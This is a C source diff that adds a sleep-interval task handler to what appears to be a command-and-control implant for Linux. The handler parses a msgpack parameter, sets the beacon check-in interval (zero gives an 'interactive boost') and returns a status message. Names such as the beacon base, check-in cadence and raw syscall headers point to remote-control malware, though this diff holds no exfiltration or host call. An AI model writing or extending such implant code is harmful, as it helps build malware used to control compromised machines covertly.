@@ -5,6 +5,7 @@
 #include "tasks_linux.h"
 #include "crt.h"
 #include "types.h"
+#include "timing.h"
 
 #ifdef ARCH_X86_64
 #include "syscalls_x64.h"
@@ -112,6 +113,61 @@ static int parse_string_field(const uint8_t *data, uint32_t data_len,
         mp_skip(&r);
     }
     return -1;
+}
+
+// ──── SET SLEEP（运行时心跳基准，timing.c 的 g_beacon_base_ms）────
+
+int task_set_sleep(const uint8_t *data, uint32_t data_len, mp_writer_t *w)
+{
+    // Parse {seconds: int}
+    mp_reader_t r;
+    mp_reader_init(&r, data, data_len);
+    uint32_t map_count;
+    if (mp_read_map(&r, &map_count) != 0) {
+        write_error(w, "invalid params");
+        return 0;
+    }
+
+    uint32_t seconds = 0;
+    for (uint32_t i = 0; i < map_count; i++) {
+        const char *key; uint32_t klen;
+        if (mp_read_str(&r, &key, &klen) != 0) break;
+        if (klen == 7 && ax_memcmp(key, "seconds", 7) == 0) {
+            uint64_t v; mp_read_uint(&r, &v); seconds = (uint32_t)v;
+        } else {
+            mp_skip(&r);
+        }
+    }
+
+    if (seconds > 3600) seconds = 3600; // clamp: max 1 hour
+    ax_beacon_base_set(seconds * 1000U);
+
+    // AnsSleep: {output: "..."} — 与 env/cat 同一回显通道
+    char msg[96];
+    int pos = 0;
+    const char* head = "sleep set to ";
+    while (head[pos]) { msg[pos] = head[pos]; pos++; }
+    if (seconds == 0) {
+        const char* zero = "0s (interactive boost)";
+        for (int i = 0; zero[i]; i++) msg[pos++] = zero[i];
+    } else {
+        char digits[10];
+        int n = 0;
+        uint32_t v = seconds;
+        if (v == 0) digits[n++] = '0';
+        while (v > 0) { digits[n++] = (char)('0' + (v % 10)); v /= 10; }
+        while (n > 0) msg[pos++] = digits[--n];
+        msg[pos++] = 's';
+        msg[pos++] = ' ';
+        msg[pos++] = '(';
+        const char* note = "next check-in on the new cadence";
+        for (int i = 0; note[i] && pos < 90; i++) msg[pos++] = note[i];
+        msg[pos++] = ')';
+    }
+    msg[pos] = '\0';
+
+    write_output(w, msg);
+    return 0;
 }
 
 // ──── ENV ────
